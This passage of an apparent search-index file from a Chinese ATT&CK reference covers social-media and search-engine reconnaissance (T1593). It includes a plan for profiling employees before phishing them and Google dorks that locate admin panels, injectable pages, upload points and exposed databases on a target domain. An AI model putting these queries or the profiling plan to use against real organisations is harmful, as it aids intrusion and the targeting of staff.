\u6d4b\u8bd5\u6848\u4f8b \u4e2a\u4eba\u7406\u89e3\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6536\u96c6\u67d0\u4f01\u4e1a\u5458\u5de5\u4fe1\u606f\uff0c\u6bd4\u5982\u524d\u671f\u6dfb\u52a0\u597d\u53cb\uff0c\u89c2\u5bdf\u5176\u793e\u4ea4\u5a92\u4f53\u4e0a\u7684\u52a8\u6001\uff0c\u7ffb\u770b\u5386\u53f2\u52a8\u6001\u4fe1\u606f\uff0c\u6536\u96c6\u5176\u5de5\u4f5c\u6c9f\u901a\u5de5\u5177\u3001\u4e0a\u4e0b\u73ed\u65f6\u95f4\u7b49\u3002\u5982\u5bf9\u65b9\u901a\u8fc7\u90ae\u7bb1\u6c9f\u901a\u4ea4\u6d41\u4e1a\u52a1\uff0c\u53ef\u4ee5\u8fdb\u884c\u9493\u9c7c\u90ae\u4ef6\u6295\u9012\u8fdb\u884c\u6e17\u900f\uff0c\u83b7\u53d6\u6743\u9650\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1593-001 https://attack.mitre.org/techniques/T1593/001/","title":"T1593-001-\u641c\u7d22\u5f00\u653e\u7684\u57df/\u7f51\u7ad9-\u793e\u4ea4\u5a92\u4f53"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#t1593-001-","text":"","title":"T1593-001-\u641c\u7d22\u5f00\u653e\u7684\u57df/\u7f51\u7ad9-\u793e\u4ea4\u5a92\u4f53"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u793e\u4ea4\u5a92\u4f53\u4e0a\u641c\u7d22\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\uff0c\u4ee5\u4fbf\u5728\u9501\u5b9a\u76ee\u6807\u65f6\u4f7f\u7528\u3002\u793e\u4ea4\u5a92\u4f53\u7f51\u7ad9\u53ef\u80fd\u5305\u542b\u6709\u5173\u53d7\u5bb3\u8005\u7ec4\u7ec7\u7684\u5404\u79cd\u4fe1\u606f\uff0c\u5982\u4e1a\u52a1\u516c\u544a\u4ee5\u53ca\u6709\u5173\u5de5\u4f5c\u4eba\u5458\u7684\u89d2\u8272\u3001\u5730\u70b9\u548c\u5174\u8da3\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6839\u636e\u4ed6\u4eec\u60f3\u8981\u6536\u96c6\u7684\u4fe1\u606f\uff0c\u5728\u4e0d\u540c\u7684\u793e\u4ea4\u5a92\u4f53\u7f51\u7ad9\u4e0a\u8fdb\u884c\u641c\u7d22\u3002\u5a01\u80c1\u8005\u53ef\u80fd\u4f1a\u88ab\u52a8\u5730\u4ece\u8fd9\u4e9b\u7f51\u7ad9\u4e0a\u6536\u96c6\u6570\u636e\uff0c\u4ee5\u53ca\u5229\u7528\u6536\u96c6\u5230\u7684\u4fe1\u606f\u521b\u5efa\u865a\u5047\u7684\u4e2a\u4eba\u8d44\u6599/\u7fa4\u7ec4\uff0c\u4ee5\u8bf1\u4f7f\u53d7\u5bb3\u8005\u900f\u9732\u7279\u5b9a\u7684\u4fe1\u606f\uff08\u5373\u9c7c\u53c9\u5f0f\u9493\u9c7c\u670d\u52a1\uff09\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\uff08\u4f8b\u5982\uff1a\u4fe1\u606f\u9493\u9c7c\u6216\u641c\u7d22\u5f00\u653e\u5f0f\u6280\u672f\u6570\u636e\u5e93\uff09\u3001\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u8d26\u6237\u6216\u7834\u574f\u8d26\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u9c7c\u53c9\u5f0f\u9493\u9c7c\uff09\u63d0\u4f9b\u673a\u4f1a\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_1","text":"\u4e2a\u4eba\u7406\u89e3\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6536\u96c6\u67d0\u4f01\u4e1a\u5458\u5de5\u4fe1\u606f\uff0c\u6bd4\u5982\u524d\u671f\u6dfb\u52a0\u597d\u53cb\uff0c\u89c2\u5bdf\u5176\u793e\u4ea4\u5a92\u4f53\u4e0a\u7684\u52a8\u6001\uff0c\u7ffb\u770b\u5386\u53f2\u52a8\u6001\u4fe1\u606f\uff0c\u6536\u96c6\u5176\u5de5\u4f5c\u6c9f\u901a\u5de5\u5177\u3001\u4e0a\u4e0b\u73ed\u65f6\u95f4\u7b49\u3002\u5982\u5bf9\u65b9\u901a\u8fc7\u90ae\u7bb1\u6c9f\u901a\u4ea4\u6d41\u4e1a\u52a1\uff0c\u53ef\u4ee5\u8fdb\u884c\u9493\u9c7c\u90ae\u4ef6\u6295\u9012\u8fdb\u884c\u6e17\u900f\uff0c\u83b7\u53d6\u6743\u9650\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_7","text":"MITRE-ATT&CK-T1593-001 https://attack.mitre.org/techniques/T1593/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/","text":"T1593-002-\u641c\u7d22\u5f00\u653e\u7684\u57df/\u7f51\u7ad9-\u641c\u7d22\u5f15\u64ce \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u641c\u7d22\u5f15\u64ce\u6765\u6536\u96c6\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u641c\u7d22\u5f15\u64ce\u670d\u52a1\u901a\u5e38\u4f1a\u6293\u53d6\u5728\u7ebf\u7f51\u7ad9\u7684\u7d22\u5f15\u5185\u5bb9\uff0c\u5e76\u53ef\u80fd\u4e3a\u7528\u6237\u63d0\u4f9b\u4e13\u95e8\u7684\u8bed\u6cd5\u6765\u641c\u7d22\u7279\u5b9a\u7684\u5173\u952e\u8bcd\u6216\u7279\u5b9a\u7c7b\u578b\u7684\u5185\u5bb9\uff08\u5373\u6587\u4ef6\u7c7b\u578b\uff09 \u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6839\u636e\u4ed6\u4eec\u60f3\u8981\u6536\u96c6\u7684\u4fe1\u606f\uff0c\u7cbe\u5fc3\u8bbe\u8ba1\u5404\u79cd\u641c\u7d22\u5f15\u64ce\u67e5\u8be2\u3002\u5a01\u80c1\u8005\u53ef\u80fd\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u6765\u6536\u96c6\u5173\u4e8e\u53d7\u5bb3\u8005\u7684\u4e00\u822c\u4fe1\u606f\uff0c\u4ee5\u53ca\u4f7f\u7528\u4e13\u95e8\u7684\u67e5\u8be2\u6765\u5bfb\u627e\u654f\u611f\u4fe1\u606f\u7684\u6cc4\u6f0f/\u6cc4\u9732\uff0c\u5982\u7f51\u7edc\u7ec6\u8282\u6216\u8bc1\u4e66\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u5f0f\u6280\u672f\u6570\u636e\u5e93\uff09\u3001\u5efa\u7acb\u4e1a\u52a1\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u8d26\u6237\u6216\u7834\u574f\u8d26\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u6709\u6548\u8d26\u6237\u6216\u9493\u9c7c\uff09\u63d0\u4f9b\u673a\u4f1a\u3002 \u6d4b\u8bd5\u6848\u4f8b google hacking \u57fa\u7840\u7bc7\uff1a * intitle\uff1a\u641c\u7d22\u7f51\u9875\u6807\u9898\u4e2d\u5305\u542b\u6709\u7279\u5b9a\u5b57\u7b26\u7684\u7f51\u9875\u3002\u4f8b\u5982intitle: \u540e\u53f0\uff0c\u8fd9\u6837\u7f51\u9875\u6807\u9898\u4e2d\u5e26\u6709\u2018\u540e\u53f0\u2019\u7684\u7f51\u9875\u90fd\u4f1a\u88ab\u641c\u7d22\u51fa\u6765\u3002 * inurl\uff1a\u641c\u7d22\u5305\u542b\u6709\u7279\u5b9a\u5b57\u7b26\u7684URL\u3002\u4f8b\u5982inurl:admin\uff0c\u53ef\u4ee5\u7528\u6765\u67e5\u627e\u7f51\u7ad9\u540e\u53f0\u3002 * intext: \u641c\u7d22\u7f51\u9875\u6b63\u6587\u5185\u5bb9\u4e2d\u7684\u6307\u5b9a\u5b57\u7b26\uff0c\u4f8b\u5982intext:\u64cd\u4f5c\u7cfb\u7edf\u3002\u53ef\u4ee5\u641c\u7d22\u542b\u6709\u2018\u64cd\u4f5c\u7cfb\u7edf\u2019\u7684\u9875\u9762 * Filetype: \u641c\u7d22\u6307\u5b9a\u7c7b\u578b\u7684\u6587\u4ef6\u3002\u4f8b\u5982\u64cd\u4f5c\u7cfb\u7edf\u3000filetype:pdf\uff0c\u5c31\u53ef\u4ee5\u627e\u5230\u5173\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7684pdf\u6587\u6863\u3002 * Site\uff1a\u627e\u5230\u4e0e\u6307\u5b9a\u7f51\u7ad9\u6709\u8054\u7cfb\u7684URL\u3002\u4f8b\u5982Site\uff1abaidu.com\u3002\u6240\u6709\u548c\u8fd9\u4e2a\u7f51\u7ad9\u6709\u8054\u7cfb\u7684URL\u90fd\u4f1a\u88ab\u663e\u793a\u3002 * movie: \u5f53\u6211\u4eec\u7528movie\u63d0\u4ea4\u67e5\u8be2\u7684\u65f6\u5019\uff0cGoogle\u4f1a\u8fd4\u56de\u8ddf\u67e5\u8be2\u5173\u952e\u8bcd\u76f8\u5173\u7684\u7535\u5f71\u4fe1\u606f\u3002(\u5f53\u524d\u53ea\u652f\u6301\u82f1\u6587Google) * info: \u67e5\u8be2\u7f51\u7ad9\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\u4f8b\u5982info:bbs.byr.cn\uff0c\u5b83\u53ea\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7ed3\u679c\uff0c\u662f\u4e00\u4e2a\u9009\u62e9\u5217\u8868\uff0c\u5217\u8868\u7684\u9009\u9879\u662f\u8fd9\u4e2a\u7f51\u7ad9\u7684\u67d0\u4e00\u65b9\u9762\u7684\u4fe1\u606f\u3002info=cache+related+link+site+intext+intitle\u3002 * \u53cc\u5f15\u53f7: \u4ee3\u8868\u5b8c\u5168\u5339\u914d\uff0c\u4f7f\u5173\u952e\u8bcd\u4e0d\u5206\u5f00\uff0c\u987a\u5e8f\u90fd\u4e0d\u80fd\u53d8\u3002 * \u51cf\u53f7: \u51cf\u53f7\u4e0e\u524d\u4e00\u4e2a\u5173\u952e\u8bcd\u4e4b\u95f4\u4e00\u5b9a\u8981\u6709\u4e00\u4e2a\u7a7a\u683c\uff0c\u4e0e\u540e\u4e00\u4e2a\u5173\u952e\u8bcd\u4e4b\u95f4\u4e00\u5b9a\u4e0d\u80fd\u6709\u7a7a\u683c\u3002\u641c\u7d22\u7ed3\u679c\u4e3a\uff0c\u5339\u914d\u524d\u4e00\u4e2a\u5173\u952e\u8bcd\u4f46\u4e0d\u5339\u914d\u540e\u4e00\u4e2a\u5173\u952e\u8bcd\u7684\u7ed3\u679c\u3002\u4f8b\u5982seo -\u641c\u7d22\u5f15\u64ce\u3002 * AND: \u903b\u8f91\u4e0e\uff0c\u8fd9\u4e2a\u547d\u4ee4\u6211\u4eec\u5176\u5b9e\u4e00\u76f4\u90fd\u5728\u7528\uff0c\u53ea\u662f\u6ca1\u6709\u610f\u8bc6\u5230\u3002\u4e00\u822c\u7528\u7a7a\u683c\u4ee3\u66ff\uff0c\u8fd8\u53ef\u4ee5\u7528\u201c+\u201d\u4ee3\u66ff\u3002\u4f8b\u5982\u9739\u96f3\u5e03\u888b+\u8d25\u4ea1\u4e4b\u5251\uff0c\u8fd4\u56de\u7684\u7ed3\u679c\u540c\u65f6\u5305\u542b\u4e24\u8005\u3002 * weather: \u67e5\u8be2\u67d0\u4e00\u5730\u533a\u6216\u57ce\u5e02\u7684\u5929\u6c14\u3002\u4e0d\u8fc7\u6211\u4eec\u8fd9\u4e00\u5730\u533a\u6216\u57ce\u5e02\u5fc5\u987b\u662fGoogle\u80fd\u8bc6\u522b\u7684\uff0c\u4f8bweather:beijing\uff0cGoogle\u5c06\u4f1a\u7ed9\u6211\u4eec\u8fd4\u56de\u5317\u4eac\u7684\u5929\u6c14\u3002 * \u661f\u53f7\uff08*\uff09: \u901a\u914d\u7b26\uff0c\u53ef\u4ee5\u5339\u914d\u4efb\u610f\u5b57\u7b26\u4e32\u3002\u4f8b\u5982\u641c\u7d22*\u64ce\uff0c\u5219\u8fd4\u56de\u7684\u7ed3\u679c\u4e2d\u4e0d\u4ec5\u6709\u201c\u641c\u7d22\u5f15\u64ce\u201d\uff0c\u8fd8\u6709\u201c\u641c\u7d22\u5de8\u64ce\u201d\u4e4b\u7c7b\u7684\u3002 * allinurl: \u7ed3\u679c\u7684url\u4e2d\u5305\u542b\u591a\u4e2a\u5173\u952e\u8bcd\u3002\u4f8b\u5982allinurl:byr jobs\uff0c\u7b49\u4e8einurl:byr inurl:jobs\u3002allinurl\u4e5f\u662f\u6392\u4ed6\u6027\u6307\u4ee4 * define: \u67e5\u8be2\u5173\u952e\u8bcd\u7684\u8bcd\u4e49\uff0c\u8d77\u7684\u662f\u5b57\u5178\u7684\u4f5c\u7528\u3002Google\u4f1a\u8fd4\u56de\u5305\u542b\u67e5\u8be2\u5173\u952e\u8bcd\u5b9a\u4e49\u7684\u7f51\u9875\uff0c\u4f8bdefine:computer\uff0c\u652f\u6301\u6c49\u5b57\u54e6\uff01 \u8fdb\u9636\u7bc7\uff1a * \u67e5\u627e\u540e\u53f0\u5730\u5740\uff1asite:\u57df\u540d inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms * \u67e5\u627e\u6587\u672c\u5185\u5bb9\uff1asite:\u57df\u540d intext:\u7ba1\u7406|\u540e\u53f0|\u767b\u9646|\u7528\u6237\u540d|\u5bc6\u7801|\u9a8c\u8bc1\u7801|\u7cfb\u7edf|\u5e10\u53f7|admin|login|sys|managetem|password|username * \u67e5\u627e\u53ef\u6ce8\u5165\u70b9\uff1asite:\u57df\u540d inurl:aspx|jsp|php|asp * \u67e5\u627e\u4e0a\u4f20\u6f0f\u6d1e\uff1asite:\u57df\u540d inurl:file|load|editor|Files * \u67e5\u770b\u811a\u672c\u7c7b\u578b\uff1asite:\u57df\u540d filetype:asp/aspx/php/jsp * \u8fc2\u56de\u7b56\u7565\uff1ainurl:cms/data/templates/images/index/ * \u7f51\u7edc\u8bbe\u5907\u5173\u952e\u8bcd\uff1aintext:WEB Management Interface for H3C SecPath Series * \u5b58\u5728\u7684\u6570\u636e\u5e93\uff1asite:\u57df\u540d filetype:mdb|asp|# \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1593-002 https://attack.mitre.org/techniques/T1593/002/ Github Hacking | Google Hacking- \u4fe1\u606f\u641c\u96c6\u7bc7 - \u6e17\u900f\u7ea2\u961f\u7b14\u8bb0 https://cloud.tencent.com/developer/article/1752139 Google Hacking\u603b\u7ed3 https://www.jianshu.com/p/f8062e2cc1d7 \u4fe1\u606f\u6536\u96c6\u4e4bGoogle Hacking\u7684\u7b80\u5355\u7528\u6cd5 https://blog.csdn.net/qq_36119192/article/details/84029809","title":"T1593-002-\u641c\u7d22\u5f00\u653e\u7684\u57df/\u7f51\u7ad9-\u641c\u7d22\u5f15\u64ce"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#t1593-002-","text":"","title":"T1593-002-\u641c\u7d22\u5f00\u653e\u7684\u57df/\u7f51\u7ad9-\u641c\u7d22\u5f15\u64ce"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u641c\u7d22\u5f15\u64ce\u6765\u6536\u96c6\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u641c\u7d22\u5f15\u64ce\u670d\u52a1\u901a\u5e38\u4f1a\u6293\u53d6\u5728\u7ebf\u7f51\u7ad9\u7684\u7d22\u5f15\u5185\u5bb9\uff0c\u5e76\u53ef\u80fd\u4e3a\u7528\u6237\u63d0\u4f9b\u4e13\u95e8\u7684\u8bed\u6cd5\u6765\u641c\u7d22\u7279\u5b9a\u7684\u5173\u952e\u8bcd\u6216\u7279\u5b9a\u7c7b\u578b\u7684\u5185\u5bb9\uff08\u5373\u6587\u4ef6\u7c7b\u578b\uff09 \u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6839\u636e\u4ed6\u4eec\u60f3\u8981\u6536\u96c6\u7684\u4fe1\u606f\uff0c\u7cbe\u5fc3\u8bbe\u8ba1\u5404\u79cd\u641c\u7d22\u5f15\u64ce\u67e5\u8be2\u3002\u5a01\u80c1\u8005\u53ef\u80fd\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u6765\u6536\u96c6\u5173\u4e8e\u53d7\u5bb3\u8005\u7684\u4e00\u822c\u4fe1\u606f\uff0c\u4ee5\u53ca\u4f7f\u7528\u4e13\u95e8\u7684\u67e5\u8be2\u6765\u5bfb\u627e\u654f\u611f\u4fe1\u606f\u7684\u6cc4\u6f0f/\u6cc4\u9732\uff0c\u5982\u7f51\u7edc\u7ec6\u8282\u6216\u8bc1\u4e66\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u5f0f\u6280\u672f\u6570\u636e\u5e93\uff09\u3001\u5efa\u7acb\u4e1a\u52a1\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u8d26\u6237\u6216\u7834\u574f\u8d26\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u6709\u6548\u8d26\u6237\u6216\u9493\u9c7c\uff09\u63d0\u4f9b\u673a\u4f1a\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_1","text":"google hacking \u57fa\u7840\u7bc7\uff1a * intitle\uff1a\u641c\u7d22\u7f51\u9875\u6807\u9898\u4e2d\u5305\u542b\u6709\u7279\u5b9a\u5b57\u7b26\u7684\u7f51\u9875\u3002\u4f8b\u5982intitle: \u540e\u53f0\uff0c\u8fd9\u6837\u7f51\u9875\u6807\u9898\u4e2d\u5e26\u6709\u2018\u540e\u53f0\u2019\u7684\u7f51\u9875\u90fd\u4f1a\u88ab\u641c\u7d22\u51fa\u6765\u3002 * inurl\uff1a\u641c\u7d22\u5305\u542b\u6709\u7279\u5b9a\u5b57\u7b26\u7684URL\u3002\u4f8b\u5982inurl:admin\uff0c\u53ef\u4ee5\u7528\u6765\u67e5\u627e\u7f51\u7ad9\u540e\u53f0\u3002 * intext: \u641c\u7d22\u7f51\u9875\u6b63\u6587\u5185\u5bb9\u4e2d\u7684\u6307\u5b9a\u5b57\u7b26\uff0c\u4f8b\u5982intext:\u64cd\u4f5c\u7cfb\u7edf\u3002\u53ef\u4ee5\u641c\u7d22\u542b\u6709\u2018\u64cd\u4f5c\u7cfb\u7edf\u2019\u7684\u9875\u9762 * Filetype: \u641c\u7d22\u6307\u5b9a\u7c7b\u578b\u7684\u6587\u4ef6\u3002\u4f8b\u5982\u64cd\u4f5c\u7cfb\u7edf\u3000filetype:pdf\uff0c\u5c31\u53ef\u4ee5\u627e\u5230\u5173\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7684pdf\u6587\u6863\u3002 * Site\uff1a\u627e\u5230\u4e0e\u6307\u5b9a\u7f51\u7ad9\u6709\u8054\u7cfb\u7684URL\u3002\u4f8b\u5982Site\uff1abaidu.com\u3002\u6240\u6709\u548c\u8fd9\u4e2a\u7f51\u7ad9\u6709\u8054\u7cfb\u7684URL\u90fd\u4f1a\u88ab\u663e\u793a\u3002 * movie: \u5f53\u6211\u4eec\u7528movie\u63d0\u4ea4\u67e5\u8be2\u7684\u65f6\u5019\uff0cGoogle\u4f1a\u8fd4\u56de\u8ddf\u67e5\u8be2\u5173\u952e\u8bcd\u76f8\u5173\u7684\u7535\u5f71\u4fe1\u606f\u3002(\u5f53\u524d\u53ea\u652f\u6301\u82f1\u6587Google) * info: \u67e5\u8be2\u7f51\u7ad9\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\u4f8b\u5982info:bbs.byr.cn\uff0c\u5b83\u53ea\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7ed3\u679c\uff0c\u662f\u4e00\u4e2a\u9009\u62e9\u5217\u8868\uff0c\u5217\u8868\u7684\u9009\u9879\u662f\u8fd9\u4e2a\u7f51\u7ad9\u7684\u67d0\u4e00\u65b9\u9762\u7684\u4fe1\u606f\u3002info=cache+related+link+site+intext+intitle\u3002 * \u53cc\u5f15\u53f7: \u4ee3\u8868\u5b8c\u5168\u5339\u914d\uff0c\u4f7f\u5173\u952e\u8bcd\u4e0d\u5206\u5f00\uff0c\u987a\u5e8f\u90fd\u4e0d\u80fd\u53d8\u3002 * \u51cf\u53f7: \u51cf\u53f7\u4e0e\u524d\u4e00\u4e2a\u5173\u952e\u8bcd\u4e4b\u95f4\u4e00\u5b9a\u8981\u6709\u4e00\u4e2a\u7a7a\u683c\uff0c\u4e0e\u540e\u4e00\u4e2a\u5173\u952e\u8bcd\u4e4b\u95f4\u4e00\u5b9a\u4e0d\u80fd\u6709\u7a7a\u683c\u3002\u641c\u7d22\u7ed3\u679c\u4e3a\uff0c\u5339\u914d\u524d\u4e00\u4e2a\u5173\u952e\u8bcd\u4f46\u4e0d\u5339\u914d\u540e\u4e00\u4e2a\u5173\u952e\u8bcd\u7684\u7ed3\u679c\u3002\u4f8b\u5982seo -\u641c\u7d22\u5f15\u64ce\u3002 * AND: 